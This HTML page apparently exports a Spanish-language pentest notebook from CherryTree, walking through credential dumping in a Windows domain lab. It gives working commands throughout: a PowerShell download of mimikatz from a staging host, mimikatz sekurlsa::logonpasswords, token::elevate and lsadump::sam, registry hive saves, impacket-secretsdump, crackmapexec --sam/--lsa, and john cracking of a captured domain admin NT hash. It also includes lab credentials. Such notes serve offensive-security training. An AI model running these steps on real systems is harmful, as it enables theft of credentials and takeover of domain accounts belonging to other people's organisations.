<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Volcado ISASS y SAM</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Volcado ISASS y SAM</h1><br/><p><h1>TÉCNICAS DE DUMP DEL LSAS Y SAM</h1></p><p></p><p>Para realizar estas técnicas es necesario tener privilegios elevados.</p><p>Esto es interesante porque aunque tengamos privilegios administrativos dentro de la máquina no los tenemos dentro del dominio, entonces si volcamos los hashes de las sesiones activas dentro del sistema, podremos intentar obtener las credenciales de un usuario que si tenga privilegios dentro del dominio.</p><p></p><p>Ahora suponemos que tenemos comprometido un usuario local de la maquina pero no tenemos acceso a ningún otro usuario.</p><p></p><p>Ejecutamos el programa de las loggonsessions con privilegios de administrador local:</p><p></p><p><img src="images/35-1.png" alt="images/35-1.png" /></p><p></p><p><img src="images/35-2.png" alt="images/35-2.png" /></p><p></p><p>Por aquí vemos un usuario de dominio que nos podría interesar comprometer</p><p></p><p><img src="images/35-3.png" alt="images/35-3.png" /></p><p></p><p>También puede darse el caso de tener un usuario de dominio que si tiene privilegios de administrador en su equipo local pero no en el dominio, para poner este ejemplo podemos asignarselos:</p><p></p><p><div class="codebox"><pre><br />net localgroup administradores corp<span style="color:#000000;font-weight:700">\</span>empleado1 <span style="color:#000000;font-weight:700">/</span>add</pre></div></p><p></p><p><img src="images/35-4.png" alt="images/35-4.png" /></p><p></p><p></p><p></p><p></p><p><h1>VOLCADO EN WINDOWS</h1></p><p></p><p>Con mimikatz en windows:</p><p></p><p><div class="codebox"><pre><br />(<span style="color:#729fcf;font-weight:400">New-Object</span> System.NET.WebClient).DownloadFile(<span style="color:#edd400;font-weight:400">&quot;http://192.168.20.129:8000/mimikatz.exe&quot;</span>, <span style="color:#edd400;font-weight:400">&quot;mimikatz.exe&quot;</span>)</pre></div></p><p></p><p>Abrimos 2 powershell, una como empleado1, otra como administrador local y otra como administrador del dominio:</p><p></p><p><img src="images/35-5.png" alt="images/35-5.png" /></p><p></p><p></p><p>Como administrador local abrimos mimikatz:</p><p><img src="images/35-6.png" alt="images/35-6.png" /></p><p></p><p>En la otra powershell como administrador local ejecutamos logonsessions:</p><p><img src="images/35-7.png" alt="images/35-7.png" /></p><p></p><p>Donde vemos dos sesiones, 1 de administrador local por empleado1 y otra de administrador de dominio.</p><p></p><p>Ahora en mimikatz:</p><p></p><p><div class="codebox"><pre><br />sekurlsa<span style="color:#000000;font-weight:700">::</span>logonpasswords</pre></div></p><p></p><p>Nos vuelca todas las credenciales almacenadas</p><p></p><p><img src="images/35-8.png" alt="images/35-8.png" /></p><p></p><p>Entre ellas las del administrador del dominio.</p><p></p><p><div class="codebox"><pre><br />a87f3a337d73085c45f9416be5787d86 </pre></div></p><p></p><p>Lo pasamos a kali:</p><p></p><p><div class="codebox"><pre><br /><span style="color:#000000;font-weight:700">echo</span> a87f3a337d73085c45f9416be5787d86 &gt; admin.hash<br />john -format=NT admin.hash --show<br /></pre></div></p><p></p><p><img src="images/35-9.png" alt="images/35-9.png" /></p><p></p><p></p><p>También podemos volcar la base de datos SAM.</p><p>Para esto deberemos tener privilegios SYSTEM</p><p></p><p>Para ello vamos a utilizar los privilegios de administrador para suplantar un access token como system</p><p></p><p>Con mimikatz:</p><p></p><p><div class="codebox"><pre><br />privilege<span style="color:#000000;font-weight:700">::</span>debug<br />token<span style="color:#000000;font-weight:700">::</span>elevate</pre></div></p><p></p><p><img src="images/35-10.png" alt="images/35-10.png" /></p><p></p><p>Suplanta el token de acceso de system, es decir; somo empleado1 con permiso de administración pero con el token de System.</p><p></p><p><div class="codebox"><pre><br />lsadump<span style="color:#000000;font-weight:700">::</span>sam</pre></div></p><p></p><p><img src="images/35-11.png" alt="images/35-11.png" /></p><p></p><p>Datos de los usuarios locales del sistema, la clave del SAM.</p><p></p><p><img src="images/35-12.png" alt="images/35-12.png" /></p><p></p><p>El usuario local WS01 con su hash.</p><p><img src="images/35-13.png" alt="images/35-13.png" /></p><p><img src="images/35-14.png" alt="images/35-14.png" /></p><p></p><p></p><p></p><p></p><p></p><p><h1>VOLCADO EN LINUX</h1></p><p></p><p><h2>Otras opciones sin mimikatz</h2>:</p><p></p><p><h3>PARA VOLCAR SAM:</h3></p><p></p><p>La SAM se monta en tiempo de ejecución en el registro por lo que:</p><p></p><p><div class="codebox"><pre><br />reg save hklm<span style="color:#000000;font-weight:700">\</span>sam sam.save<br />reg save hklm<span style="color:#000000;font-weight:700">\</span>system system.save<br /></pre></div></p><p></p><p>Los llevamos a linux.</p><p></p><p><div class="codebox"><pre><br />impacket-secretsdump -sam sam.save -system system.save LOCAL</pre></div></p><p></p><p><img src="images/35-15.png" alt="images/35-15.png" /></p><p></p><p></p><p></p><p><h3>PARA VOLCAR LSAS:</h3></p><p></p><p><img src="images/35-16.png" alt="images/35-16.png" /></p><p><img src="images/35-17.png" alt="images/35-17.png" /></p><p><img src="images/35-18.png" alt="images/35-18.png" /></p><p></p><p>Lo pasamos a Kali o una maquina windows con mimikatz:</p><p></p><p><div class="codebox"><pre><br />sekurlsa<span style="color:#000000;font-weight:700">::</span>minidump C<span style="color:#000000;font-weight:700">:\</span>Users<span style="color:#000000;font-weight:700">\</span>empleado1<span style="color:#000000;font-weight:700">\</span>Desktop<span style="color:#000000;font-weight:700">\</span>lsass.DMP<br />sekurlsa<span style="color:#000000;font-weight:700">::</span>logonPasswords<br /></pre></div></p><p></p><p><img src="images/35-19.png" alt="images/35-19.png" /></p><p></p><p></p><p>Desde kali:</p><p></p><p>En este caso necesitamos que el usuario sea un usuario de dominio con permisos de administrador locales como empleado1.</p><p><div class="codebox"><pre><br />impacket-secretsdump empleado1<span style="color:#000000;font-weight:700">:</span>Passw0rd1@192.168.20.131</pre></div></p><p></p><p><img src="images/35-20.png" alt="images/35-20.png" /></p><p></p><p></p><p><div class="codebox"><pre><br />crackmapexec smb 192.168.20.131 -u empleado1 -p <span style="color:#edd400;font-weight:400">&quot;Passw0rd1&quot;</span> --sam</pre></div></p><p></p><p><img src="images/35-21.png" alt="images/35-21.png" /></p><p></p><p><div class="codebox"><pre><br />crackmapexec smb 192.168.20.131 -u empleado1 -p <span style="color:#edd400;font-weight:400">&quot;Passw0rd1&quot;</span> --lsa</pre></div></p><p></p><p><img src="images/35-22.png" alt="images/35-22.png" /></p><p></p><p></p><p></p></div>
</body>
</html>
